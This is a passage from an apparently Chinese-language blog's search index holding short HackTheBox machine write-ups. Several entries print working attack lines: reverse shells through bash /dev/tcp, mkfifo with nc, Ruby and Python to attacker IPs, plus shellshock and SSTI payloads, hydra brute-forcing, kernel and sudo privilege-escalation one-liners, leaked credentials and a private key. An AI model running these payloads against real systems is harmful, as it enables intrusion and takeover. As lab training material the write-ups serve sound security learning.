/tmp/sh\u0026rsquo;).waitFor()\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/9.jpg","permalink":"https://nergigantes.github.io/htb/mango/","title":"Mango"},{"content":"HackTheBox MetaTwo 网站框架CVE获取用户shell和破解私钥提权_gpg2john-CSDN博客\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/27.jpg","permalink":"https://nergigantes.github.io/htb/metatwo/","title":"MetaTwo"},{"content":"寻找立足点 扫描端口，22，53，80\n80打开空白网页，目录扫到admin，发现是Pi-hole Version v3.1.4\n用默认的登录ssh\nRaspberry Pi Distributions Username Password Raspberry Pi OS pi raspberry DietPi root dietpi Lakka Linux root root Kali Linux root toor OpenELEC root openelec Arch Linux ARM root root Debian pi raspberry LibreELEC root libreelec OSMC osmc osmc QtonPi root rootme Ubuntu Server ubuntu ubuntu ROKOS rokos rokos Retropie pi raspberry 权限提升 sudo -l查看能全局root权限\n直接sudo su升到root\n拿root.txt文件返回说不存在了，但在usb中有备份\nlsblk查看usb数据发现挂在/media/usbstick文件中\n进入查看\n又说被删了，让我们查看能不能恢复\n1 strings /dev/sdb 查看被删到的根标志\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/25.jpg","permalink":"https://nergigantes.github.io/htb/mirai/","title":"Mirai"},{"content":"寻找立足点 扫端口无发现，无域名，目录扫描\n网页打开，得知是cacti 1.2.22\n用poc拿到shell\n进入发现是docker\n在这个docker中根目录有个root文件告诉我们如何查询数据库\n根据这个语法拿到用户名密码，爆破\nssh登录\n权限提升 sudo -l无发现\n查看docker版本这个版本存在CVE-2021-41091\n在docker中有一个capsh文件能够执行一个root环境\n然后再这个环境中我们给/bin/bash权限\n再在主机使用这个docker的bash就能用root权限\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/10.jpg","permalink":"https://nergigantes.github.io/htb/monitorstwo/","title":"MonitorsTwo"},{"content":"寻找立足点 扫描端口，只开了80\n网页打开提示一个目录/nibbleblog进去后是个博客\n扫目录扫到一个后台管理，admin.php\n网上搜索默认密码\nadmin,binnles进去了\n在一个image编辑能上传文件，上传一个php的shell（用php编写的网页）\n\u003c?php system(\"bash -c 'sh -i \u0026\u003e/dev/tcp/10.10.16.29/80 0\u003e\u00261'\");?\u003e\n拿到shell\n权限提升 nibbler-\u0026gt;root sudo -l\n知道有一个/home/nibbler/personal/stuff/monitor.sh文件能以root权限运行\n想法是给这个sh文件增加我们自己的弹shell的代码\necho \u0026lsquo;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2\u0026gt;\u0026amp;1 | nc 10.10.16.29 8443 \u0026gt; /tmp/f\u0026rsquo; | tee -a /home/nibbler/personal/stuff/monitor.sh\n\u0026lt;font style=\u0026quot;color:#000000;\u0026quot;\u0026gt;echo '...'\u0026lt;/font\u0026gt;: 输出包含在引号中的字符串。 \u0026lt;font style=\u0026quot;color:#000000;\u0026quot;\u0026gt;rm /tmp/f;\u0026lt;/font\u0026gt;: 删除 \u0026lt;font style=\u0026quot;color:#000000;\u0026quot;\u0026gt;/tmp/f\u0026lt;/font\u0026gt; 文件，如果它存在。 \u0026lt;font style=\u0026quot;color:#000000;\u0026quot;\u0026gt;mkfifo /tmp/f;\u0026lt;/font\u0026gt;: 创建一个命名管道 \u0026lt;font style=\u0026quot;color:#000000;\u0026quot;\u0026gt;/tmp/f\u0026lt;/font\u0026gt;。 \u0026lt;font style=\u0026quot;color:#000000;\u0026quot;\u0026gt;cat /tmp/f | /bin/sh -i 2\u0026gt;\u0026amp;1 | nc 10.10.14.7 8443 \u0026gt; /tmp/f\u0026lt;/font\u0026gt;: 从 FIFO 读取数据并通过 \u0026lt;font style=\u0026quot;color:#000000;\u0026quot;\u0026gt;/bin/sh\u0026lt;/font\u0026gt; 解释执行。 将标准错误重定向到标准输出（\u0026lt;font style=\u0026quot;color:#000000;\u0026quot;\u0026gt;2\u0026gt;\u0026amp;1\u0026lt;/font\u0026gt;），使得错误输出也能通过管道传递。 使用 \u0026lt;font style=\u0026quot;color:#000000;\u0026quot;\u0026gt;nc\u0026lt;/font\u0026gt; 命令将输出发送到地址 \u0026lt;font style=\u0026quot;color:#000000;\u0026quot;\u0026gt;10.10.14.7\u0026lt;/font\u0026gt; 的端口 \u0026lt;font style=\u0026quot;color:#000000;\u0026quot;\u0026gt;8443\u0026lt;/font\u0026gt;。 将来自 \u0026lt;font style=\u0026quot;color:#000000;\u0026quot;\u0026gt;/tmp/f\u0026lt;/font\u0026gt; 的输入写入标准输出。 \u0026lt;font style=\u0026quot;color:#000000;\u0026quot;\u0026gt;| tee -a monitor.sh\u0026lt;/font\u0026gt;: 将接收到的字符串追加到 \u0026lt;font style=\u0026quot;color:#000000;\u0026quot;\u0026gt;monitor.sh\u0026lt;/font\u0026gt; 然后sudo /home/nibbler/personal/stuff/monitor.sh就可拿到root\necho \u0026lsquo;cp /bin/bash /tmp/3.sh\u0026rsquo; | tee /usr/sbin/proc_redis.sh\n文件中，并同时显示在终端。 然后 ","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/4.jpg","permalink":"https://nergigantes.github.io/htb/nibbles/","title":"Nibbles"},{"content":"学到了使用hydra爆破密码，\n1 2 3 4 5 hydra -l none -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form \u0026#34;/db/index.php:password=^PASS^\u0026amp;remember=yes\u0026amp;login=Log+In\u0026amp;proc_login=true:Incorrect password\u0026#34; -t 64 -V [443][http-post-form] host: 10.10.10.43 login: none password: password123 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form \u0026#34;/department/login.php:username=^USER^\u0026amp;password=^PASS^:Invalid\u0026#34; -t 64 -V [80][http-post-form] host: 10.10.10.43 login: admin password: 1q2w3e4r5t 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 Description: phpliteadmin.php#1784: \u0026#39;Creating a New Database\u0026#39; =\u0026gt; phpliteadmin.php#1785: \u0026#39;When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.\u0026#39;, An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser. Proof of Concept: 1. We create a db named \u0026#34;hack.php\u0026#34;. (Depending on Server configuration sometimes it will not work and the name for the db will be \u0026#34;hack.sqlite\u0026#34;. Then simply try to rename the database / existing database to \u0026#34;hack.php\u0026#34;.) The script will store the sqlite database in the same directory as phpliteadmin.php. Preview: http://goo.gl/B5n9O Hex preview: http://goo.gl/lJ5iQ 2. Now create a new table in this database and insert a text field with the default value: \u0026lt;?php phpinfo()?\u0026gt; Hex preview: http://goo.gl/v7USQ 3. Now we run hack.php Done! 这里有个点拿到reshell\n进入后扫进程看到靶机使用了\nChkrootkit 存在0.49以下的版本漏洞\n创建/tmo/update文件\n文件里可以执行root权限的命令\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/10.jpg","permalink":"https://nergigantes.github.io/htb/nineveh/","title":"Nineveh"},{"content":"fuzz爆出develop目录看源码\n分析源码利用exec语句构造playload\n提权时查看rebor用户目录下的py文件\n提权root时\nsudo -l 查看\nsudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py\n这个文件是暂时读取etc/shadow文件复制到/tmp/SSH中\n利用方式\n一写一个脚本实时复制/tmp/SSH文件\n二\n我们可以重命名BetterSSH文件夹\n然后自己建一个BetterSSH文件夹和提权py文件\n然后运行\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/3.jpg","permalink":"https://nergigantes.github.io/htb/obscurity/","title":"Obscurity"},{"content":"寻找立足点 扫描端口22,80\n打开网页没有东西，dirsearch,gobuster扫到/ona，一个后台管理网站\n直接给了版本18.1.1网上搜索poc\npython test.py exploit \u0026ldquo;http://10.10.10.171/ona\u0026rdquo;(网站要用双引号)\n利用成功，在里面的mysql配置里拿到了密码\n配合curl反弹拿到了shell\n权限提升 使用上面发现的密码**n1nj4W4rri0R!**能从用户提升到jimmy\njimmy-\u0026gt;joanna netstat -an查看网络连接的状态\n可以看到本地网站的52846有一个网页挂着，去到网页的默认目录/var/www看看情况\ncat main.php中可以读代码知道打开这个网页能读到joanna的ssh密钥\ncurl 127.0.0.1:52846/main.php拿到密钥\n这是一个私钥。需要解密\n**ssh2john** 是John the Ripper 工具的一部分，专门用于将 SSH 密钥文件转换为适合 John the Ripper 破解的哈希文件\n1 ssh2john joanna.key \u0026gt; joanna-key.hash 然后john破解得到密钥bloodninjas\n配合密钥文件一起ssh登录joanna用户\njoanna-\u0026gt;root sudo -l\nsudo nano去编辑/opt/priv文件\n1 2 3 4 CTRL+R CTRL+X reset; sh 1\u0026gt;\u0026amp;0 2\u0026gt;\u0026amp;0 ENTER 会得到一个伪shell（root）\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/26.jpg","permalink":"https://nergigantes.github.io/htb/openadmin/","title":"OpenAdmin"},{"content":"寻找立足点 扫描端口22,80,443\n80，443打开发现是个appech\n查看网页字段头发现主机名\noffice.paper\n打开这个主机，发现是wordpress\n查看版本是5.2.3，发现有个cve查看秘密信息，\n又知道一个域名，打开这个域名后发现有个聊天群，里面有个机器人可以查看文件\n利用这点查看这个机器人的环境变量\nrecyclops file ../../../../../proc/self/environ\n拿到ssh账号密码登录\ndwight，Queenofblad3s!23\n权限提升 从dwight-\u0026gt;root 用最新的linpeas.sh扫描\n发现sudo 1.8.29版本\n搜索得知存在CVE-2021-3560\n使用poc拿到root\necho \u0026rsquo;nc%208.219.57.114%202333%20-e%20sh\u0026rsquo; \u0026gt;/usr/sbin/proc_redis.sh\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/4.jpg","permalink":"https://nergigantes.github.io/htb/paper/","title":"Paper"},{"content":"网页模板为CuteNews2.1.2\n有poc\n使用进入弹shell\n然后linpeash.sh扫到适合pwnkit\n使用脚本得到root\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/7.jpg","permalink":"https://nergigantes.github.io/htb/passage/","title":"Passage"},{"content":"扫端口到50002\n弱口令登录拿到token\nid注入sqlmap拿到ssh账号密码\n之后root提权有点懵\ncurl -i -s -k -X $\u0026lsquo;POST\u0026rsquo; \u0026ndash;data-binary $\u0026lsquo;jk=pyimport%20os;os.system(\u0026quot;chmod%20u%2Bs%20%2Fbin%2Fbash\u0026quot;);f=function%20f2(){};\u0026amp;package=xxx\u0026amp;crypted=AAAA\u0026amp;\u0026amp;passwords=aaaa\u0026rsquo; $\u0026lsquo;http://127.0.0.1:8000/flash/addcrypted2\u0026rsquo;\nCVE-2023-0297\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/22.jpg","permalink":"https://nergigantes.github.io/htb/pc/","title":"PC"},{"content":"寻找立足点 拿到网站扫描端口，在浏览器打开发现底部有提示WEBrick1.7.0，寻找该版本漏洞未果后发现是ruby语言（Wappalyzer扩展收集信息）\n了解到ruby语言与python语言用高级语言搭建的服务器通常有模板，衍生想到模板注入SSTI\n在全网站为一有参数的地方试出playpoad=a%0A\u0026lt;%25+命令+%25\u0026gt;\n反弹shell，试了原装playload不行，要base64转码而且要拼接（不太懂为什么）\n最后playload为a%0A\u0026lt;%25%3dsystem(\u0026ldquo;echo+IyEvYmluL2Jhc2gKYmFzaCAtaSA=PiYgL2Rldi90Y3AvMTAuMTAuMTYuMjkvMTMzNyAwPiYx|+base64+-d+|+bash\u0026rdquo;);+%25\u0026gt;\n+代替空格防止被url转码\n最后拿到shell\n提权 开始提权\n被科普了一种提权文件linpeas.sh，枚举系统可能提权的文件信息然后标注给我们\n这台靶机不行，看wp了解到有提示创始人susan用户密码的格式\n大概意思就是需要用户自己重置密码，重置的格式为{名字_名字的逆序_在(1,1000000000)之间的一个随机数}，尝试使用hashcat的掩码爆破功能破解\nhashcat -m 1400 -a 3 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d?d?d?d?d\nhashcat -m 1400：你使用 hashcat 工具来破解一个密码散列。-m 1400 选项指定了散列类型，是一个 NTLMv1 散列。\n-a 3：你使用的是第 3 类攻击模式，这是字典和递增攻击的结合。\nabe\u0026hellip;：这是你想要破解的密码散列。\nsusan_nasus_?d?d?d?d?d?d?d?d?d：这是你的密码候选项。? 字符表示未知字符，在破解过程中将被替换为实际字符（1-1000000000为9位数字）\n破解出密码susan_nasus_413759210\n使用ssh\nsudo su root提权\n靶机完成\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/22.jpg","permalink":"https://nergigantes.github.io/htb/perfection/","title":"perfection"},{"content":"寻找立足点 扫端口正常，有域名爆子域名无发现，目录扫描没发现\n打开网页看到一个路径/print\n要验证，是Basic验证，准备爆破密码，但是在源码上看到一个js文件，点进去看见一个\n有账号密码点进去，里面有一个下载图片的功能，Burp拦截测试一下\n有三个注入点，逐一测试一下\n在filetype上存在注入点，curl配合反弹shell。拿到shell\n权限提升 sudo -l 查看root文件\n在最后一行运用了find命令，但是是相对路径，本来是运用/usr/bin/find的，\n但是我们可以伪造一个find bash文件\n然后\n1 sudo PATH=$PWD:$PATH /opt/cleanup.sh 将当前存在我们伪造的find文件的文件夹作为优先环境变量，这样cleanup.sh文件最后一行就会优先执行我们的find文件而不是/usr/bin/find文件，从而以root权限执行了bash\n拿到了root\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/12.jpg","permalink":"https://nergigantes.github.io/htb/photobomb/","title":"Photobomb"},{"content":"寻找立足点 拿到ip扫端口，网页打开有域名扫子域名，然后目录爆破没有发现\nnmap扫到80端口有/.git库但是我们网页打不开，借用工具git-dumper\n下载下来查看到源码\npython git-dumper -url git\n读这个数据库拿到emily用户的密码，ssh登录\n权限提升 sudo -l无法现，几个常用的提权脚本也没用\nps aux查看系统进程\n发现一个root运行的脚本\n漏洞在Binwalk上\n该系统的Binwalk版本是2.3.2的\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/5.jpg","permalink":"https://nergigantes.github.io/htb/pilgrimage/","title":"Pilgrimage"},{"content":"有域名但扫不到子域名，目录爆出来个torrent目录\n这个网站可以上传一个正确的bt种子，然后可以编辑种子的‘头像’\n将文件类型改为image/png\n然后就能上传phpshell文件\n权限提升 linpeas扫到适用dirtycow\n然后也有gcc环境\n直接上Poc\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/26.jpg","permalink":"https://nergigantes.github.io/htb/popcorn/","title":"Popcorn"},{"content":"寻找立足点\n扫描端有俩个不正常的\n10000,6379\n先看10000是个https网页，是一个cms登录，常用的密码无效，查看6379端口\n得知6379端口是redis\nredis-cli -h 尝试登录，成功了\n了解到可以\nRedis 使用 root 账户运行（甚至不使用），攻击者可以将 SSH 公钥文件写入 root 账户，直接通过 SSH 登录受害者服务器。这可能允许黑客获得服务器权限、删除或窃取数据，甚至导致加密勒索，从而严重危害正常的业务服务。\n首先在redis上创建一个.ssh文件夹\n1 2 config get dir config set dir /var/lib/redis/.ssh 在我们kali上创建一个rsa（伪造ssh认证）\n注意要这样\n(echo -e \u0026ldquo;\\n\\n\u0026rdquo;; cat id_rsa.pub; echo -e \u0026ldquo;\\n\\n\u0026rdquo;) \u0026gt; temp.txt\n\\n\\n为了将一些乱码隔行防止它们阻碍我们的代码\n然后将temp.txt传到redis中\ncat temp.txt | redis-cli -h -x set crackit\nconfig set dbfilename \u0026ldquo;authorized_keys\u0026quot;将内容保存到authorized_keys中\n然后save 保存\n然后ssh连接成功\n权限提升 浏览到/opt文件夹中含有用户Matt的ssh备份文件\n下载下来破解密钥\n得到密钥computer2008\nssh连接关闭，尝试从redis su升级一下\n成功\nsudo -l 无发现\n注意到刚刚那个10000端口的网页用得到的用户密码去登录\n成功\n看到cms版本的webmin 1.910\nmsf存在可利用poc\n设置参数成功拿到root\n注意将ssl设置为true\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/9.jpg","permalink":"https://nergigantes.github.io/htb/postman/","title":"Postman"},{"content":"寻找立足点 扫描端口无发现，打开网站使用插件得知该网站使用的是Phusion Passenger（网络服务器）\n经探测输入一个可访问的网站会提供给我一个快照，下载该图片分析\n使用exiftool工具进行分析\n得知信息\npdfkit v0.8.6版本创建，搜索发现有个CVE-2022-25765\ncurl \u0026lsquo;TARGET_ADDRESS\u0026rsquo; -X POST -H \u0026lsquo;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\u0026rsquo; -H \u0026lsquo;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8\u0026rsquo; -H \u0026lsquo;Accept-Language: en-US,en;q=0.5\u0026rsquo; -H \u0026lsquo;Accept-Encoding: gzip, deflate\u0026rsquo; -H \u0026lsquo;Content-Type: application/x-www-form-urlencoded\u0026rsquo; -H \u0026lsquo;Origin: TARGET_ADDRESS\u0026rsquo; -H \u0026lsquo;Connection: keep-alive\u0026rsquo; -H \u0026lsquo;Referer: TARGET_ADDRESS\u0026rsquo; -H \u0026lsquo;Upgrade-Insecure-Requests: 1\u0026rsquo; \u0026ndash;data-raw \u0026lsquo;url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-ADDRESS%22%2CLOCAL-PORT%29%29%27%60\u0026rsquo;\n进入拿到ruby身份\n权限提升 ruby-\u0026gt;henry 在用户主目录下查看隐藏文件\nls -la\n/home/ruby/.bundle中有配置文件中含有henry的密码\nssh连接\nhenry-\u0026gt;root sudo -l 查看可root文件\n/opt/update_dependencies.rb\n读文件可知这个文件能以root权限加载一个文件\ndependencies.yml，现在创建一个木马文件\n后sudo /usr/bin/ruby /opt/update_dependencies.rb\n执行成功后第二步 /bin/bash -p\n拿到root\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/24.jpg","permalink":"https://nergigantes.github.io/htb/precious/","title":"Precious"},{"content":"寻找立足点 扫描端口正常，打开网页是个登录的页面，由php编写\n尝试各种密码无反应\n目录扫描时发现许多php页面都被重定向到了login.php的页面，并且重定向之前和之后的文件大小不一致\n这里了解到**重定向上的文件大小不一致是由称为 EAR 或 Execute After Redirect 漏洞的漏洞引起的。**\n说明存在网页但是被重定向了，这里可以使用burp拦截重定向，然后把302代码改成200即可成功返回，也可使用curl 命令直接下载对应网页的源码进行分析，也可以直接在burp上读到注册用户的界面直接注册用户以便登录\n用户登录后能寻找到一些源码，在logs.php中存在命令注入\n直接在burp改到logs.php去添加执行参数试了很多的payload都没成功\n最后面要到file_logs.php这里点击后再添加payload参数才会成功（猜测文件头的问题，但是我核对了很多都没发现到具体的参数头问题）\n权限提升 进入的用户是www-data，没权限拿不到user.txt，但是在之前我们找到了服务器的配置文件，里面存放着mysql的用户密码，登录查看数据库里有没有存放着什么东西、\n在这之前要把交互shell升级一下python3 -c \u0026lsquo;import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)\u0026rsquo;\n不然mysql登录会很久很久，而且没有回显\n在配置文件中的数据库中accounts表中找到了\nm4lwhere的hash密码\njohn爆破得到\n之后ssh登录这个用户\nsudo -l查看root权限文件\n发现一个文件能用root权限gzip文件压缩日志\n这时候我们可以伪造一个gzip文件，让这个文件误以为是gzip工具，但其实是我们的提权手段\n像这样\n不过以sudo执行的文件，都是通过$PATH的路径\nPATH是Linux和类Unix操作系统中的环境变量，它指定存储可执行程序的所有bin和sbin目录。当用户在终端上执行任何命令时，它会通过PATH变量来响应用户执行的命令，并向shell发送请求以搜索可执行文件。超级用户通常还具有/sbin和/usr/sbin条目，以便于系统管理命令的执行。\n这意味着我们伪造的gzip提权文件只能放在系统环境的路径下执行才有效\n正常的PATH路径我们没有权限写文件\n但是这个系统我们可以人工添加一个path路径，然后再我们有权限写文件的路径下执行我们的提权文件\n最后sudo 执行，成功拿到root\n(别忘记改gzip文件的权限)\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/14.jpg","permalink":"https://nergigantes.github.io/htb/previse/","title":"Previse"},{"content":"网站打开，搜索功能\n网站源代码有 Spring boot的提示\n猜测为ssti模板注入\n用收集的java spring playload试一试\n*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\u0026lsquo;id\u0026rsquo;).getInputStream())}\n这里的命令不能直接curl ip/shell |bash 执行\n具体原因不清楚\n但是可以先把reshell -o输出到/tmp文件夹下\n然后再/bin/bash 执行这个反弹shell\n权限提升 总的来说是根据一个图片的xxe攻击拿root的ssh凭证\n但是步骤太多了且对js代审不太了解，直接看wp拿到了\n\u0026mdash;\u0026ndash;BEGIN OPENSSH PRIVATE KEY\u0026mdash;\u0026ndash;\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29\nugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ\nAAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ\nRwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=\n\u0026mdash;\u0026ndash;END OPENSSH PRIVATE KEY\u0026mdash;\u0026ndash;\nchmod 600\n登录\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/22.jpg","permalink":"https://nergigantes.github.io/htb/redpanda/","title":"RedPanda"},{"content":"拿到网站扫描端口\n22，80，55555\n80打不开，55555端口跳转的web目录，得知该网站服务器是\nrequest-baskets version 1.2.1\n得知存在一个\nCVE-2023-27163\nRequest-baskets 是一个 Web 应用程序，用于收集和注册特定路由（即 basket）上的请求。创建请求时，用户可以指定其他服务器来转发请求。此处的问题是，用户可以指定意外的服务，例如网络关闭的应用程序。\n用脚本生成一个地址以重定向到80端口让我们康康里面有什么好东西\n打开给我们生成的网站，得知该网站是\nMaltrail v0.53\n搜索发现poc拿下shell\n权限提升 从puam-\u0026gt;root sudo -l 查看root文件\n发现有**/usr/bin/systemctl** status trail.service\n直接执行\n后输入!/bin/bash\n等待些许拿到root\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/2.jpg","permalink":"https://nergigantes.github.io/htb/sau/","title":"Sau"},{"content":"页面下载源文件\n有.git\n查看日志\ngit show\n发现token密钥然后伪造admin身份\n看源码logs有注入点\n命令注入拿到shell 然后Pwnkit脚本提权\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/3.jpg","permalink":"https://nergigantes.github.io/htb/secret/","title":"Secret"},{"content":"寻找立足点 扫描端口没有发现，打开网站同样\n进行目录爆破\n扫到了/cgi-bin\n是一个常见的目录名称，通常在Web服务器上用于存放可执行的CGI（Common Gateway Interface）脚本。这些脚本允许Web服务器与外部程序进行交互，从而可以生成动态内容,重点关注\n但是扫不到可以用的脚本，看wp发现有个user.sh可用（为什么我扫不到，同样的字典）\n这个user.sh可以用curl.sh传递字符串，用shellshock漏洞拿到shell\ncurl -H \u0026lsquo;User-Agent: () { :; }; /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/HTBoxVPNIP/1903 0\u0026gt;\u0026amp;1\u0026rsquo; http://shocker.htb/cgi-bin/user.sh\n权限提升 sudo -l 看到可以用\n网上搜索知道Perl 脚本仍然是为各种系统管理任务编写自动化任务脚本\n语法为\nperl -e \u0026lt;Perlcode\u0026gt;\nsudo perl -e \u0026rsquo;exec \u0026ldquo;/bin/sh\u0026rdquo;;\u0026lsquo;拿到root\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/13.jpg","permalink":"https://nergigantes.github.io/htb/shocker/","title":"Shocker"},{"content":"端口正常，有域名扫子域名\n我用的11w的字典扫不到mattermost这个字段？？\n存在login登录界面\nsql注入试一下\nadmin\u0026rsquo; || \u0026lsquo;1\u0026rsquo; ==\u0026lsquo;1\n这个playload能行\n登录后有个搜索界面，能搜到用户的md5hash密码\nadmin用户\n再sql注入一下试试\n切换到deploy，该用户在docker用户组\n1 docker run -v /:/mnt --rm -it alpine chroot /mnt sh 使用这个运行root\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/7.jpg","permalink":"https://nergigantes.github.io/htb/shoppy/","title":"Shoppy"},{"content":"JAMES 2.3.2\n存在root/root\n扫全部端口4555改密码\n110拿到半shell\nrbash转bash\n权限提升 pspy32\n看系统进程得知运行一个py文件，我们可以改写\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/19.jpg","permalink":"https://nergigantes.github.io/htb/solidstate/","title":"SolidState"},{"content":"寻找立足点 端口无发现。有域名扫子域名发现一个dev\n主网站目录扫描无发现\n进入子域名让我们登录\n看wp说有个消息头或者看wazz能看到当前框架是express\n这是一个js类型的框架\n然后联想到绕过node.js登录\nNoSQL 注入 |黑客技巧\n{\u0026ldquo;username\u0026rdquo;:{\u0026quot;$ne\u0026quot;:null},\u0026ldquo;password\u0026rdquo;:{\u0026quot;$ne\u0026quot;:null}}\n登录跳转到stock，是一个购物的\n随便选一个加购购买会生成一个pdf文件，保存用exiltool查看这个pdf文件\n\u0026lt;iframe src=file:///etc/passwd height=1050px width=800px\nssh登录\n权限提升 sudo -l查看\n/usr/bin/node /usr/local/scripts/*.js\n能用node运行/usr/local/scripts/目录下的js文件\n但这个目录里我们的用户没用写的权限\n这里用的是/usr/bin/node是绝对路径，所以环境变量劫持没用\n看了wp是用/..为一个向上目录\n然后构造到一个我们可以写js文件的目录\n比如我们的用户主目录下\nsudo /usr/bin/node /usr/local/scripts/../../../home/angoose/demo.js\n1 require(\u0026#34;child_process\u0026#34;).spawn(\u0026#34;/bin/sh\u0026#34;, {stdio: [0, 1, 2]}) 然后拿到root权限\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/18.jpg","permalink":"https://nergigantes.github.io/htb/stocker/","title":"Stocker"},{"content":"寻找立足点 扫描端口正常1，有域名扫子域名正常，目录爆破也没东西\n在登录页面看到是matebases\nmsf存在可以利用漏洞\n改参数执行拿到shell\n权限提升 linpeas.sh扫不到东西\nuname -r查看内核\n发现适合\nCVE-2023-2640-CVE-2023-32629\n执行\n1 2 unshare -rm sh -c \u0026#34;mkdir l u w m \u0026amp;\u0026amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m \u0026amp;\u0026amp; touch m/*;\u0026#34; \u0026amp;\u0026amp; u/python3 -c \u0026#39;import os;os.setuid(0);os.system(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ","date":"2025-03-19T16:38:27+08:00","image":"https://nergigantes.github.io/20.jpg","permalink":"https://nergigantes.github.io/htb/analytics/","title":"Analytics"},{"content":"寻找立足点 扫端口正常，无域名，扫目录\n一个CHANGELOGO路径下的文件显示了是一个是Drupal 7.56的版本\n存在CVE-2018-7600,\n不知道为啥自己写的反shell php用不了，用searchsploit的却可以\n（写脚本转成base64过限制）\n用kali自带的拿到个假shell\n然后了解Drupal 7.56的配置文件在\n1 sites/default/settings.php 后查看到数据库的用户密码\n数据库连接失败（猜测为假shell不是本地，所以没有权限连接）\n\u0026lsquo;database\u0026rsquo; =\u0026gt; \u0026lsquo;drupal\u0026rsquo;,\n'username' =\u0026gt; 'drupaluser', 'password' =\u0026gt; 'CQHEy@9M*m23gBVj' 1 mysql -u drupaluser -pCQHEy@9M*m23gBVj -e \u0026#39;show databases;\u0026#39; 后面能看到user表\n里面存在一个用户和密码，hashcat解码拿到密码为booboo\nssh连接成功\n权限提升 sudo -l查看可root权限文件\nsudo /usr/bin/snap install *\n折 | 走开Bins (gtfobins.github.io)\n查看用法\n使用前先安装fpm\nsudo gem install fpm\n1 COMMAND=id 将id替换成更改权限的命令（ssh）\n这里使用bash文件\n在靶机中的bash文件复制到用户主目录下（这里不直接更改bash是bash上存在了关联一堆的包，复制出来使用单独的bash文件）\ncp /usr/bin/bash ~/bash\nCOMMAND=\u0026ldquo;chown root:root /home/brucetherealadmin/bash;chmod 4755 /home/brucetherealadmin/bash\u0026rdquo;\n根据gowayby的命令生成了一个snap文件\n上传到靶机上\n1 sudo snap install xxxx_1.0_all.snap --dangerous --devmode 执行\n\u0026ndash;dangerous \u0026ndash;devmode 意思是打开危险模式和开发者模式\n然后等待执行\n可以看到用户目录下的bash文件所有者权限是root了\n然后./bash -p 启动bash文件\n-p是启动特权者模式，以./bash文件的权限执行\n","date":"2025-03-19T16:38:27+08:00","image":"https://nergigantes.github.io/22.jpg","permalink":"https://nergigantes.github.io/htb/armageddon/","title":"Armageddon"},{"content":"寻找立足点 nmap扫描端口，只有一个80\n打开网页dirsearch扫下目录，dev路径下有伪shell\n尝试反向shell\n1 python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.16.29\u0026#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; 拿到www-data身份的shell\n提权 www-data-\u0026gt;scriptmanager 